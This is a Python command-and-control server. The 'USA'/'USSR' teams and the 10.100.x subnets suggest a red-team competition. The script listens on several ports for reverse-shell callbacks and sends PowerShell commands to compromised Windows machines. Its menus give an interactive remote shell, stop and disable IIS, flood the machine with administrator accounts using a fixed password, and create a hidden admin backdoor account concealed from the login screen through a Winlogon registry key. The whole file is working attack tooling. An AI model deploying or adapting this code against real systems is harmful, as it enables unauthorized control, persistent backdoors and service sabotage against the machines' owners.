import socket
import time
import random
import threading

PORTS = [80, 443, 8080, 3306, 4444, 5985, 8443]

# sends a powershell command to the target box and returns the output
def send_command(ip, command):
    try:
        with sessions_lock:
            if ip not in sessions:
                return "[!] No active session"
            conn = sessions[ip]["conn"]

        conn.send((command + "\n").encode("utf-8"))
        time.sleep(3)

        response = b""
        conn.settimeout(5)
        try:
            while True:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass

        return response.decode("utf-8", errors="ignore")
    except Exception as e:
        return f"[!] Send failed: {e}"

NAME_POOLS = {
    "USA": [
        "james_brooks", "michael_reed", "david_lane", "robert_hayes",
        "william_ford", "thomas_grant", "charles_bell", "daniel_shaw",
        "matthew_cole", "andrew_ross", "ryan_price", "kevin_hunt",
        "brian_stone", "steven_wade", "paul_bishop", "mark_burns",
        "jason_marsh", "eric_norris", "scott_quinn", "jeffrey_page"
    ],
    "USSR": [
        "nikolai", "tikhnov", "dmitri_volkov", "kuIagin",
        "kozlov", "novikov", "lebedev", "gusav",
        "tikhanov", "zhakov", "brezhev", "zhkov",
        "nikitin", "tertiak", "kasatunov", "vasiIiev",
        "Iebedev", "Iarionov", "kulegin", "kulikov"
    ]
}

sessions = {}
sessions_lock = threading.Lock()

# registers a new incoming connection into the sessions dictionary, and replacing stale ones
def register_session(ip, conn, port):
    with sessions_lock:
        if ip in sessions:
            try:
                sessions[ip]["conn"].close()
            except Exception:
                pass
        sessions[ip] = {"conn": conn, "port": port, "team": guess_team(ip)}
        print(f"\n[+] New session: {ip} on port {port} (team: {guess_team(ip)})")
        print("    Type 'sessions' at any prompt to see all active connections.")

# based on the IP subnet, automatically sets the session as either USA or USSR for name pool
def guess_team(ip):
    if ip.startswith("10.100.2."):
        return "USA"
    elif ip.startswith("10.100.3."):
        return "USSR"
    return "USA"  # default for testing

# removes a dead session from the session registry
def remove_session(ip):
    with sessions_lock:
        if ip in sessions:
            del sessions[ip]
            print(f"[-] Session dropped: {ip}")

# continuously accepts new connections on a given port and registers them
def accept_loop(server, port):
    while True:
        try:
            conn, addr = server.accept()
            ip = addr[0]
            register_session(ip, conn, port)
        except Exception:
            break

# spins up one listener thread per port so all ports are monitored simultaneously
def start_listeners():
    for port in PORTS:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", port))
            server.listen(10)
            t = threading.Thread(target=accept_loop, args=(server, port), daemon=True)
            t.start()
            print(f"[*] Listener started on port {port}")
        except Exception as e:
            print(f"[!] Could not bind port {port}: {e}")

# builds the powershell command string to create a local user, optionally as admin
def make_user_command(username, admin=False):
    password = "Welcome1!"
    cmd = (
        f'New-LocalUser -Name "{username}" '
        f'-Password (ConvertTo-SecureString "{password}" -AsPlainText -Force) '
        f'-PasswordNeverExpires'
    )
    if admin:
        cmd += f'; Add-LocalGroupMember -Group "Administrators" -Member "{username}"'
    return cmd

# returns a shuffled copy of the name pool for the given team, restarts when exhausted
def get_name_queue(team):
    pool = NAME_POOLS.get(team, NAME_POOLS["USA"])[:]
    random.shuffle(pool)
    return pool

# drops a specified number of users onto the target box with an optional delay between each
def flood_users(ip, team, count, delay=0):
    queue = get_name_queue(team)
    used = []
    created = 0
    print(f"\n[*] Starting user drop — {count} users, {delay}s delay each\n")
    while created < count:
        if not queue:
            print("[*] Queue exhausted, reshuffling...")
            queue = [n for n in get_name_queue(team) if n not in used[-10:]]
        username = queue.pop(0)
        used.append(username)
        cmd = make_user_command(username, admin=True)
        print(f"[+] Creating ({created + 1}/{count}): {username}")
        result = send_command(ip, cmd)
        if result.strip():
            print(result)
        created += 1
        if delay > 0 and created < count:
            print(f"[*] Waiting {delay}s...")
            time.sleep(delay)
    print(f"\n[+] Done. {count} users created.")

# creates a single hidden admin user and buries it from the windows login screen via registry
def create_hidden_user(ip):
    username = "svc_diag"
    password = "Diag$2024!"
    cmd_create = (
        f'New-LocalUser -Name "{username}" '
        f'-Password (ConvertTo-SecureString "{password}" -AsPlainText -Force) '
        f'-PasswordNeverExpires'
    )
    cmd_admin = f'Add-LocalGroupMember -Group "Administrators" -Member "{username}"'
    cmd_hide  = (
        f'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT'
        f'\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" '
        f'-Name "{username}" -Value 0 -PropertyType DWord -Force'
    )
    print(f"\n[*] Creating hidden user: {username}")
    print(send_command(ip, cmd_create))
    print(send_command(ip, cmd_admin))
    print(send_command(ip, cmd_hide))
    print(f"[+] Hidden user '{username}' created | password: {password}")

# menu for selecting how to drop users onto the targe: instant flood, slow drip, or hidden
def user_flood_menu(ip, team):
    while True:
        print(f"\n--- User Flood Menu [{team}] ---")
        print("  [1] Drop 10 users instantly")
        print("  [2] Slow drip — 1 user every 5 min (up to 5)")
        print("  [3] Create 1 hidden admin user")
        print("  [0] Back")
        choice = input("Select> ").strip()
        if choice == "0":
            break
        elif choice == "1":
            flood_users(ip, team, count=10, delay=0)
        elif choice == "2":
            threading.Thread(
                target=flood_users,
                args=(ip, team, 5, 300),
                daemon=True
            ).start()
            print("[*] Slow drip running in background.")
        elif choice == "3":
            create_hidden_user(ip)

# menu for running pre-built attack automations against the selected session
def automation_menu(ip, team):
    automations = {
        "1": ("Disable IIS",       "Stop-Service -Name W3SVC; Set-Service -Name W3SVC -StartupType Disabled"),
        "2": ("Check IIS status",  "Get-Service -Name W3SVC | Select-Object Status"),
        "3": ("Whoami + hostname", "whoami; hostname"),
        "4": ("List local admins", "Get-LocalGroupMember -Group Administrators"),
        "5": ("User flood",        None),
    }
    while True:
        print(f"\n--- Automation Menu [{team}] ---")
        for key, (label, _) in automations.items():
            print(f"  [{key}] {label}")
        print("  [0] Back")
        choice = input("Select> ").strip()
        if choice == "0":
            break
        elif choice == "5":
            user_flood_menu(ip, team)
        elif choice in automations:
            label, cmd = automations[choice]
            print(f"\n[*] Running: {label}")
            print(send_command(ip, cmd))

# opens the interaction menu for a specific session selected by IP
def interactive_mode(ip):
    print(f"[*] Interactive shell on {ip}. Type 'back' to return.\n")
    while True:
        cmd = input(f"{ip}> ").strip()
        if cmd.lower() == "back":
            break
        if cmd:
            print(send_command(ip, cmd))

# opens the interaction menu for a specific session selected by an IP
def session_menu(ip):
    with sessions_lock:
        if ip not in sessions:
            print(f"[!] No active session for {ip}")
            return
        session = sessions[ip]
    team = session["team"]
    port = session["port"]

    while True:
        print(f"\n=== Session: {ip} | Team: {team} | Port: {port} ===")
        print("  [1] Interactive shell")
        print("  [2] Automations")
        print("  [3] Back to session list")
        choice = input("Select> ").strip()
        if choice == "1":
            interactive_mode(ip)
        elif choice == "2":
            automation_menu(ip, team)
        elif choice == "3":
            break

# prints all currently active sessions with their IP, port, and team
def print_sessions():
    with sessions_lock:
        if not sessions:
            print("\n[!] No active sessions.")
            return
        print("\n--- Active Sessions ---")
        for i, (ip, data) in enumerate(sessions.items(), 1):
            print(f"  [{i}] {ip:15s}  port: {data['port']}  team: {data['team']}")

# top-level menu for browsing and selecting active sessions to interact with
def sessions_menu():
    while True:
        print("\n======== C2 SESSIONS ========")
        print_sessions()
        print("\n  [i]  Interact with a session (enter IP)")
        print("  [r]  Refresh session list")
        print("  [q]  Quit")
        choice = input("\nC2> ").strip().lower()
        if choice == "q":
            print("[*] Exiting.")
            break
        elif choice == "r":
            continue
        elif choice == "i":
            ip = input("Enter target IP> ").strip()
            with sessions_lock:
                if ip not in sessions:
                    print(f"[!] No session for {ip}. Check IP or wait for callback.")
                    continue
            session_menu(ip)

def main():
    print("[*] Starting listeners...")
    start_listeners()
    print(f"[*] Listening on ports: {PORTS}")
    print("[*] Waiting for callbacks...\n")
    sessions_menu()

if __name__ == "__main__":
    main()